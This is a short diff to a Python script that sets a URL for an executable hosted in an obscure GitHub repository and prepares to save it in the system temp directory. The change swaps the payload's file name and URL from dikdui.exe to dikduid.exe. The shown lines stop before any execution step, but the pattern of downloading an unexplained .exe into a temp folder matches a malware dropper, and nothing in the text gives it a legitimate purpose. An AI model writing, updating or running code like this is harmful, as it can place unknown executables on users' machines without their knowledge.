@@ -2,8 +2,8 @@ import os
 import urllib.request
 import tempfile
 
-EXE_URL = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui.exe"
-EXE_NAME = "dikdui.exe"
+EXE_URL = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikduid.exe"
+EXE_NAME = "dikduid.exe"
 
 def main():
     tempdir = tempfile.gettempdir()
